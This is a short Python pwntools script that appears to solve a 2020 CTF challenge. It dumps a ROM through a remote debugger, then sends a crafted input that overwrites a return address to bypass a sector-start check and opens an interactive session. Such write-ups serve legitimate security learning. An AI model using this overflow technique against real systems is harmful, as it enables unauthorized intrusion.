from pwn import *

# context.log_level = "DEBUG"

DEBUGGER_ARGS = ["./debugger.py", "registers.2020.ctfcompetition.com", "1337"]

def send_dbg_cmd(dbg_io, cmd):
    dbg_io.sendlineafter("DBG> ", cmd)

def dump_rom(dump_file):
    io = process(DEBUGGER_ARGS)
    io.sendlineafter("Choice: ", "D")
    send_dbg_cmd(io, "break 0x104")
    send_dbg_cmd(io, "cont")
    for i in range(0, 0x1000):
        print(".", end="")
        lo, hi = i & 0xFF, i >> 8
        send_dbg_cmd(io, f"reg 26 0 30 {lo} 31 {hi}")
        send_dbg_cmd(io, "cont")
        io.recvuntil("gp0 = ")
        dump_file.write(bytes([int(io.recvuntil(" "), 16)]))
    io.close()

if __name__ == "__main__":
    # with open("rom.dump", "wb") as f:
    #     dump_rom(f)
    io = process(DEBUGGER_ARGS)
    io.sendlineafter("Choice: ", "C")
    # ascii "1" so W becomes 1 after the atoi thing
    # spam null bytes onto stack so Y becomes 0 after pop
    # overwrite return address to 0x233 (past sector start check
    # and right after num sectors read)
    io.sendlineafter("): ", "1"+"\x00"*7+"\x00\x02\x33")
    io.interactive()
